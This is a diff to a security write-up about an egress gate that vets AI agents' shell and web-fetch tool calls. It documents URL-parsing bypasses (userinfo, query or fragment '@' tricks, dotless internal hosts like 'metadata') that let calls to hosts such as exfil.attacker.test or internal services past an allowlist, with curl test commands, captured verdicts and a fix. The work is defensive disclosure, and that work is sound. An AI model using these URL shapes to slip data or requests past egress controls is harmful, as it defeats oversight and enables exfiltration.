@@ -28,10 +28,11 @@ behaviour while claiming to demonstrate this slice.
 
 **Two subsections of §5 are later, and say so where they appear.** The blocks under *A URL the gate
 itself mis-parses* and *Every shell command that mentions a URL* were captured during this branch's
-final review round, against a Guardian started the same way from commit `27a4624` of this tree, on
-**port 8797**. They are the only blocks in this file taken from a different process, and they
-measure two changes to `annotateEgressDestination` that `16a3ab0` does not contain — which is
-exactly why they are not presented as if they came from the run above.
+final review round, against a Guardian started the same way from commit `0dabe6e` of this tree, on
+**port 8799**. They are the only blocks in this file taken from a different process, and they
+measure changes to `annotateEgressDestination` that `16a3ab0` does not contain — which is exactly
+why they are not presented as if they came from the run above. Section 2's policy-input block was
+re-run against the same commit, because what lands at the annotation path changed with them.
 
 ## Prerequisites
 
@@ -222,9 +223,12 @@ destination; no allowlist pattern matches a command line, so every benign shell 
 denied. And where nothing bounds the host on the right, trailing shell text is swallowed into it,
 turning an allowlisted destination into a denial.
 
-So the Guardian extracts the first absolute http(s) URL out of `raw_command` and answers at the
-gate's own last declared path. `annotateEgressDestination` is the whole of that code, and it
-answers `{destination}` or `{}` — never a throw, and never `null`.
+So the Guardian extracts the first absolute http(s) URL out of `raw_command`, parses it, and
+answers with its **origin** — scheme, host and port — at the gate's own last declared path.
+`annotateEgressDestination` is the whole of that code, and it answers `{destination}` or `{}` —
+never a throw, and never `null`. Why an origin rather than the URL as matched is §5's subject: an
+origin cannot carry a userinfo, a query or a fragment, and each of those three is a shape
+`host_of()` reads as part of the host.
 
 **The denied command.**
 
@@ -345,6 +349,7 @@ async function show(command: string): Promise<void> {
 
 await show("curl https://exfil.attacker.test/steal");
 await show("curl https://docs.anthropic.com/x");
+await show("curl https://metadata?x=@docs.anthropic.com");
 await show("echo hi");
 ```
 
@@ -352,25 +357,32 @@ Captured:
 
 ```
 raw_command        "curl https://exfil.attacker.test/steal"
-input.annotations  {"egress":{"destination":"https://exfil.attacker.test/steal"}}
+input.annotations  {"egress":{"destination":"https://exfil.attacker.test"}}
 verdict            {"decision":"deny","reason":"egress_destination_not_allowed","message":"destination exfil.attacker.test not in allowlist [\"*.anthropic.com\", \"docs.example.com\"]"}
 
 raw_command        "curl https://docs.anthropic.com/x"
-input.annotations  {"egress":{"destination":"https://docs.anthropic.com/x"}}
+input.annotations  {"egress":{"destination":"https://docs.anthropic.com"}}
 verdict            {"decision":"allow","result_labels":["public"]}
+
+raw_command        "curl https://metadata?x=@docs.anthropic.com"
+input.annotations  {"egress":{"destination":"https://metadata"}}
+verdict            {"decision":"deny","reason":"egress_destination_not_allowed","message":"destination metadata not in allowlist [\"*.anthropic.com\", \"docs.example.com\"]"}
 
 raw_command        "echo hi"
 input.annotations  {"egress":{}}
 verdict            {"decision":"allow","result_labels":["public"]}
+
 ```
 
-Three things a reader can check here rather than believe. The destination lands at
+Four things a reader can check here rather than believe. The destination lands at
 `input.annotations.egress.destination` — one of the five entries in the `default_destination_paths`
-array quoted at the top of this file, published by AGT and not invented on this side. The verdict
-the gate reaches from it is the same verdict the wire
-carried in the two `curl` captures above, `message` and all. And the third row is the answer for a
-command with no destination in it: `{}`, not an error and not a guess — which is the subject of
-section 5.
+array quoted at the top of this file, published by AGT and not invented on this side. What lands
+there is an **origin**, not the command's URL: `https://exfil.attacker.test`, where the command
+said `https://exfil.attacker.test/steal`. The verdict the gate reaches from it is the same verdict
+the wire carried in the two `curl` captures above, `message` and all. The third row is the shape
+§5 is about — the command names `metadata`, trailed by an allowlisted name inside a query, and what
+reaches the gate is `https://metadata`, which it denies. And the fourth is the answer for a command
+with no destination in it: `{}`, not an error and not a guess — also §5's subject.
 
 ### What the manifest had to say for this to happen at all
 
@@ -663,7 +675,7 @@ first `:`, and calls what is left the host. A URL's userinfo sits before an `@` 
 
 ```bash
 OPA=node_modules/.bun/agent-control-specification-opa-darwin-arm64@0.3.1-beta.0/node_modules/agent-control-specification-opa-darwin-arm64/bin/opa
-for u in 'https://exfil.attacker.test/steal' 'https://docs.anthropic.com@exfil.attacker.test/steal' 'https://docs.anthropic.com:pw@exfil.attacker.test/steal' 'https://evil.test?x=a@docs.anthropic.com' 'https://evil.test#a@docs.anthropic.com'; do
+for u in 'https://exfil.attacker.test/steal' 'https://docs.anthropic.com@exfil.attacker.test/steal' 'https://docs.anthropic.com:pw@exfil.attacker.test/steal' 'https://evil.test?x=a@docs.anthropic.com' 'https://evil.test#a@docs.anthropic.com' 'https://metadata?x=@docs.anthropic.com' 'https://internal-api#@docs.anthropic.com'; do
   out=$("$OPA" eval -d policy/lib/egress.rego -f raw "data.agt.egress.host_of(\"$u\")")
   printf '%-63s -> %s\n' "host_of(\"$u\")" "\"$out\""
 done
@@ -675,6 +687,8 @@ host_of("https://docs.anthropic.com@exfil.attacker.test/steal") -> "docs.anthrop
 host_of("https://docs.anthropic.com:pw@exfil.attacker.test/steal") -> "docs.anthropic.com"
 host_of("https://evil.test?x=a@docs.anthropic.com")             -> "evil.test?x=a@docs.anthropic.com"
 host_of("https://evil.test#a@docs.anthropic.com")               -> "evil.test#a@docs.anthropic.com"
+host_of("https://metadata?x=@docs.anthropic.com")               -> "metadata?x=@docs.anthropic.com"
+host_of("https://internal-api#@docs.anthropic.com")             -> "internal-api#@docs.anthropic.com"
 ```
 
 The third row is the whole finding. `docs.anthropic.com:pw@exfil.attacker.test` splits at the `:`
@@ -682,20 +696,28 @@ into `docs.anthropic.com`, which `*.anthropic.com` covers — so the gate allows
 to `exfil.attacker.test`. **This parser is AGT's**, in the vendored bundle `bun run verify:pin`
 holds byte-identical; it is not this side's code and not a defect this deployment introduced.
 
-The last two rows are the same blind spot one step further out, and they matter to the fix below.
-RFC 3986 ends an authority at the first of `/`, **`?`** or **`#`**, and `host_of()` bounds at `/`
-alone — so it hands back a whole query string or fragment as the host. Both of those rows still
-*deny* against this allowlist, because a host with a `?` in it matches no pattern; but the host the
-gate names is not the host the request reaches. Measured with `curl -w '%{url.host}'`, both of
-those URLs resolve `evil.test`.
+The last four rows are the same blind spot one step further out, and they are why the fix below is
+a parse rather than another patch. RFC 3986 ends an authority at the first of `/`, **`?`** or
+**`#`**; `host_of()` bounds at `/` alone, so it hands back a whole query string or fragment as the
+host. Measured with `curl -w '%{url.host}'`, those four URLs resolve `evil.test`, `evil.test`,
+`metadata` and `internal-api` respectively — never the allowlisted name trailing them.
+
+**Rows four and five deny; rows six and seven do not, and the difference is a single dot.**
+The allowlist glob's `*` spans one dot-delimited segment. `evil.test?x=a@docs` `anthropic` `com` is
+four segments against `*.anthropic.com`'s three, so it fails to match and the call denies. But
+`metadata?x=@docs` `anthropic` `com` is exactly three — the `*` swallows the whole
+`metadata?x=@docs` segment, the pattern matches, and the call is **allowed**. Measured, before the
+fix below, on both routes. Dotless hosts are internal names — `metadata`, `internal-api` — which is
+precisely the class an egress gate is deployed for, so this is the shape that matters most and the
+one that looks least alarming.
 
 **The blocks in this subsection and the next were captured after the rest of this file**, against a
-Guardian started the same way from commit `27a4624` of this tree, on **port 8797** rather than 8791
+Guardian started the same way from commit `0dabe6e` of this tree, on **port 8799** rather than 8791
 — a fresh process on its own port, for the same reason the setup section names a port at all.
 Substitute whichever port your own Guardian printed.
 
 ```bash
-ACS=http://localhost:8797/acs
+ACS=http://localhost:8799/acs
 ask() {  # ask <request_id> <json payload>
   jq -cn --arg r "$1" --argjson p "$2" '{jsonrpc:"2.0",id:1,method:"steps/toolCallRequest",params:{
     acs_version:"0.1.0",request_id:$r,timestamp:"2026-08-18T00:00:00Z",
@@ -707,7 +729,9 @@ for u in 'https://exfil.attacker.test/steal' \
          'https://docs.anthropic.com@exfil.attacker.test/steal' \
          'https://docs.anthropic.com:pw@exfil.attacker.test/steal' \
          'https://evil.test?x=a@docs.anthropic.com' \
-         'https://evil.test#a@docs.anthropic.com'; do
+         'https://evil.test#a@docs.anthropic.com' \
+         'https://metadata?x=@docs.anthropic.com' \
+         'https://internal-api#@docs.anthropic.com'; do
   n=$((n+1))
   fetch=$(ask "e0000000-0000-4000-8000-00000000000$n" "$(jq -cn --arg u "$u" '{tool:{name:"WebFetch"},arguments:{url:{value:$u}}}')")
   shell=$(ask "e0000000-0000-4000-8000-00000000010$n" "$(jq -cn --arg u "$u" '{tool:{name:"Bash"},arguments:{command:{value:("curl "+$u)}},raw_command:("curl "+$u)}')")
@@ -721,18 +745,23 @@ https://docs.anthropic.com@exfil.attacker.test/steal     fetch: deny  | shell: d
 https://docs.anthropic.com:pw@exfil.attacker.test/steal  fetch: allow | shell: deny
 https://evil.test?x=a@docs.anthropic.com                 fetch: deny  | shell: deny
 https://evil.test#a@docs.anthropic.com                   fetch: deny  | shell: deny
+https://metadata?x=@docs.anthropic.com                   fetch: allow | shell: deny
+https://internal-api#@docs.anthropic.com                 fetch: allow | shell: deny
 ```
 
-**The shell route is closed here. The fetch route is not, and the asymmetry is not an oversight.**
+**The shell route is closed here — every one of the seven shapes above reads `shell: deny`. The
+fetch route is not, and the asymmetry is not an oversight.**
 
 On the shell route, the Guardian *chooses* the string it hands the gate: `raw_command` is a command
-line, and `annotateEgressDestination` decides what destination to answer with. It now removes any
-userinfo before answering — everything from after the `://` up to and including the `@` that ends
-the authority — so `host_of()` resolves the host the request actually reaches. That is a correction
-to this side's own input, not to AGT's parser. The verdict, in full:
+line, and `annotateEgressDestination` decides what destination to answer with. It parses that URL
+and answers with its **origin** — scheme, host and port, and nothing else. An origin cannot carry a
+userinfo, a query or a fragment *by construction*, so every shape in the table above collapses to
+the host the request actually reaches, and the only job left for `host_of()` is splitting the port
+off, which it does correctly. That is a correction to this side's own input, not to AGT's parser.
+The verdict, in full:
 
 ```bash
-curl -s -X POST http://localhost:8797/acs \
+curl -s -X POST http://localhost:8799/acs \
   -H 'content-type: application/json' \
   -d '{"jsonrpc":"2.0","id":202,"method":"steps/toolCallRequest","params":{"acs_version":"0.1.0","request_id":"bb000002-0000-4000-8000-000000000002","timestamp":"2026-08-18T00:00:00Z","metadata":{"agent_id":"demo","session_id":"5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75"},"payload":{"tool":{"name":"Bash"},"arguments":{"command":{"value":"curl https://docs.anthropic.com:pw@exfil.attacker.test/steal"}},"raw_command":"curl https://docs.anthropic.com:pw@exfil.attacker.test/steal"}}}' | jq .
 ```
@@ -760,38 +789,54 @@ curl -s -X POST http://localhost:8797/acs \
 }
 ```
 
-**Where the authority ends is the whole of that fix, and the first version of it got that wrong.**
-Written against the shape the finding was raised for, the strip bounded the authority at the first
-`/` — which is right for a URL with a path and wrong for the last two rows of the table above. On a
-path-less URL, an `@` inside a query or a fragment was read as a userinfo delimiter and everything
-before it discarded, so `https://evil.test?x=a@docs.anthropic.com` was normalised to
-`https://docs.anthropic.com` and **allowed**. Measured, on a Guardian started from the commit that
-shipped that first version: both of those rows read `shell: allow`, where both had been denied
-before the strip existed at all. The bypass class this subsection is about, re-opened by the
-normalisation written to close it — and reachable with no userinfo semantics at all, by appending
-`?x=a@` and an allowlisted host to a URL the attacker already controls.
+**This took three tries, and the two that failed are the reason it is a parse and not a pattern.**
+Recorded here rather than quietly corrected, because a normalisation that re-opens the class it was
+written to close is worth a reader's time.
 
-What ships bounds the authority at the first `/`, `?` **or** `#`, which is where RFC 3986 ends one,
-and the table above is the re-capture from that build. The three cases are pinned by their own
-tests: an `@` in a query, an `@` in a fragment, and a userinfo that genuinely does sit ahead of a
-query — the bound is where the authority ends, not a blanket refusal to strip. It is recorded here
-rather than quietly corrected because the shape that nearly shipped is the shape a reader should be
-able to check.
+- **First**, the URL was handed over as matched. That is the colon-bearing userinfo row: allowed.
+- **Second**, a userinfo strip bounded at the first `/`. Right for a URL with a path; on a
+  path-less URL it read an `@` inside a query or fragment as the userinfo delimiter and discarded
+  everything before it, so `https://evil.test?x=a@docs.anthropic.com` became
+  `https://docs.anthropic.com` and was **allowed** — a shape that had denied before the strip
+  existed. Measured on a Guardian started from the commit that shipped it.
+- **Third**, the same strip bounded at `/`, `?` and `#`. That fixed rows four and five and left
+  rows six and seven untouched, because the dotless-host shape is not about the bound at all — the
+  strip correctly declines to strip, and the *gate* is what mis-reads what it is handed.
 
-Note what the last two rows do *not* show. They deny, but the gate's own message names the host as
-`evil.test?x=a@docs.anthropic.com` — `host_of()` has the identical `?`/`#` blind spot, one layer
-down, and this deployment cannot correct it. Right verdict, wrong host, and it holds only because
-no allowlist pattern happens to match a string with a `?` in it.
+Three rounds, three shapes. What they have in common is a hand-rolled parse, so the parse is no
+longer hand-rolled: `new URL(...).origin`, with the throw caught and answered `{}` so the function
+stays total. Nothing bespoke is left beside it — two answers to "what is the host" is the same
+two-declarations-of-one-fact hazard this slice removed from the policy-target argument.
+
+The table above is the re-capture from that build, and every shape in it is pinned by its own test:
+plain userinfo, colon-bearing userinfo, an `@` in a path, an `@` in a query, an `@` in a fragment, a
+userinfo genuinely ahead of a query, the three dotless hosts, a port, and a match the parser rejects
+answering `{}` rather than throwing.
+
+**Two effects worth stating because they are not denials.** A URL parse lowercases the host, and the
+allowlist glob is case-sensitive — so `curl https://DOCS.ANTHROPIC.COM/x` **denied** before this
+change and **allows** after it. That is correct, since DNS is case-insensitive and the request
+reaches the allowlisted host either way, but it is a widening and is recorded as one. The controls
+that stop it being read as "case no longer matters" were measured beside it:
+`curl https://EVIL.TEST/x` still denies, and so does `curl https://docs.anthropic.com.evil.test/x`.
+And the path, query and fragment are now discarded before the gate sees them, which costs nothing
+today — the gate consults only `host_of(dest)` — and would cost something only to a deployment that
+pointed `cfg.egress.destination_paths` at a rule expecting a whole URL. This repository ships no
+such path.
 
 On the fetch route there is no such seam. `args.url` is the **first** entry in the gate's own
 `default_destination_paths` — the same property section 1 celebrates as costing no code — so the
 tool's argument reaches `host_of()` with nothing in between. Correcting the parse would mean
 editing `policy/lib/egress.rego`, and *not editing a `.rego`* is this slice's central claim, held
-mechanically by `bun run verify:pin`. So the fetch half is published rather than fixed. The same
-half is also what keeps the middle row honest: `https://docs.anthropic.com@exfil.attacker.test/steal`
-is denied on both routes, but before this change the shell route denied it for the host
-`docs.anthropic.com@exfil.attacker.test` — right verdict, wrong host, which is not the same as
-being decided about correctly.
+mechanically by `bun run verify:pin`. So the fetch half is published rather than fixed — and the
+table shows it costs **three** live shapes, not one: the colon-bearing userinfo and both dotless
+hosts read `fetch: allow`. A fetch tool is the likelier route to a URL an attacker supplied, which
+is worth saying plainly rather than leaving to be inferred from a column.
+
+The shell route's own denials also name the right host now, which the earlier rounds did not.
+`https://docs.anthropic.com@exfil.attacker.test/steal` was denied before this work too, but for the
+host `docs.anthropic.com@exfil.attacker.test` — right verdict, wrong question, which is not the same
+as being decided about correctly.
 
 ### Every shell command that *mentions* a URL is decided about, and this allowlist denies most of them
 
@@ -801,7 +846,7 @@ command never dereferences looks exactly like a `curl` to it. The shipped allowl
 reachable entry, so in this deployment that reads as **deny any shell command mentioning a URL**:
 
 ```bash
-ACS=http://localhost:8797/acs
+ACS=http://localhost:8799/acs
 n=0
 while IFS= read -r c; do
   n=$((n+1))
